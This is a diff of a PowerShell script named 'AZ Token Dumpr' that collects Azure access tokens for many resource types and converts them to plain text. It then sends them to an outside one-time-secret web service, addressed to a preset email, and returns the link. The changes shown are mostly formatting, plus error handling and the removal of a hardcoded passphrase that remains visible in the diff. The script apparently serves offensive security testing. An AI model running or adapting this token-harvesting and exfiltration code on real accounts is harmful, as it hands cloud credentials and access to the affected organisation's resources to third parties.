@@ -3,12 +3,12 @@
 Generates access tokens for various Azure resources and shares them via One-Time Secret.
 
 .DESCRIPTION
-The AccessToken function retrieves access tokens for a predefined set of Azure resource types. 
-It then shares these tokens securely using the One-Time Secret service. The function accepts 
+The AccessToken function retrieves access tokens for a predefined set of Azure resource types.
+It then shares these tokens securely using the One-Time Secret service. The function accepts
 optional parameters for the recipient email and passphrase used for the One-Time Secret.
 
 .PARAMETER receiptEmail
-The email address of the recipient who will receive the One-Time Secret link. 
+The email address of the recipient who will receive the One-Time Secret link.
 Defaults to "r.dijkman@securehats.nl".
 
 .PARAMETER passphrase
@@ -27,12 +27,12 @@ Generates access tokens and shares them via One-Time Secret with the specified e
 function AccessToken {
     param (
         $receiptEmail = "r.dijkman@securehats.nl",
-        $passphrase = "B74ckC@t",
+        $passphrase = "",
         $version = '1.0.9'
-    )   
-    
+    )
+
     if (-not(Get-Module -Name 'Az.Accounts')) {
-        Write-Output "The Az.Accounts module is required to run this function. Please install the module and try again." 
+        Write-Output "The Az.Accounts module is required to run this function. Please install the module and try again."
         exit
     }
 
@@ -45,18 +45,18 @@ function AccessToken {
 
     $null = Set-AzConfig -DisplayBreakingChangeWarning $false
     Clear-Host
-    
+
     try {
         $tokens = @()
 
         $logo = @"
-    |     |'''''||     |''||''|         '||                          '||''|.                                        
-   |||        .|'         ||      ...    ||  ..    ....  .. ...       ||   ||  ... ...  .. .. ..   ... ...  ... ..  
-  |  ||      ||           ||    .|  '|.  || .'   .|...||  ||  ||      ||    ||  ||  ||   || || ||   ||'  ||  ||' '' 
- .''''|.   .|'            ||    ||   ||  ||'|.   ||       ||  ||      ||    ||  ||  ||   || || ||   ||    |  ||     
-.|.  .||. ||......|      .||.    '|..|' .||. ||.  '|...' .||. ||.    .||...|'   '|..'|. .|| || ||.  ||...'  .||.    
-                                                                                                    ||              
-                                                                                                   ''''            
+    |     |'''''||     |''||''|         '||                          '||''|.
+   |||        .|'         ||      ...    ||  ..    ....  .. ...       ||   ||  ... ...  .. .. ..   ... ...  ... ..
+  |  ||      ||           ||    .|  '|.  || .'   .|...||  ||  ||      ||    ||  ||  ||   || || ||   ||'  ||  ||' ''
+ .''''|.   .|'            ||    ||   ||  ||'|.   ||       ||  ||      ||    ||  ||  ||   || || ||   ||    |  ||
+.|.  .||. ||......|      .||.    '|..|' .||. ||.  '|...' .||. ||.    .||...|'   '|..'|. .|| || ||.  ||...'  .||.
+                                                                                                    ||
+                                                                                                   ''''
                                     --- AZ Token Dumpr v$version ---
 
 "@
@@ -64,13 +64,15 @@ function AccessToken {
         Write-Host $logo
         foreach ($resourceTypeName in $resourceTypeNames) {
             try {
-                $accessToken = (Get-AzAccessToken -ResourceTypeName $resourceTypeName -AsSecureString)
+                $accessToken = (Get-AzAccessToken -ResourceTypeName $resourceTypeName -AsSecureString -ErrorAction SilentlyContinue)
 
-                $tokenObject = [PSCustomObject]@{
-                    Resource = $resourceTypeName
-                    Token    = ($accessToken.token | ConvertFrom-SecureString -AsPlainText)
+                if ($accessToken) {
+                    $tokenObject = [PSCustomObject]@{
+                        Resource = $resourceTypeName
+                        Token    = ($accessToken.token | ConvertFrom-SecureString -AsPlainText)
+                    }
+                    $tokens += $tokenObject
                 }
-                $tokens += $tokenObject
             }
             catch {
                 Write-Error "Failed to get access token for resource type $resourceTypeName : $($_.Exception.Message)"
@@ -87,7 +89,7 @@ function AccessToken {
                 passphrase = $($passphrase)
             }
         }
-    
+
         $response = Invoke-RestMethod @requestParam
         return "https://us.onetimesecret.com/secret/$($response.secret_key)"
     }
